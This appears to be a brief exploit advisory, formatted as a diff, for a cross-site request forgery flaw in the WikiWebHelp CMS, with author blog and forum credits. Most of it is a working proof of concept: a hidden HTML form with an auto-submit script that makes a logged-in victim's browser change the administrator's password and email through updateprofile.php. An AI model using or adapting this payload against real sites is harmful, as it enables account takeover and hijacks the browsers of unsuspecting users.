@@ -1,0 +1,23 @@
+#Blog: yoyahack.blogspot.com
+#Site: foro.undersecurity.net
+#Mail: yoyahack@undersecurity.net
+#CMS: WikiWebHelp
+
+The entire system is vulnerable to CSRF (Cross-site request forgery) since
+this does not include a system to prevent CSRF attacks ...
+
+Example
+
+Change the password of users, including the administrator.
+
+Exploit:
+
+<form name="CSRF" method="post" action="
+http://127.0.0.1/wwh/handlers/updateprofile.php?id=1">
+<input type='hidden' name='pass' value='password'>
+<input type='hidden' name='confirm' value='confirm_password'>
+<input type='hidden' name='email' value='email'>
+<input type='hidden' name='sub' value='on'>
+<input type='hidden' name='id' value='1'>
+<input type='hidden' name='subscribe' value='true'>
+<script>document.CSRF.submit()</script>
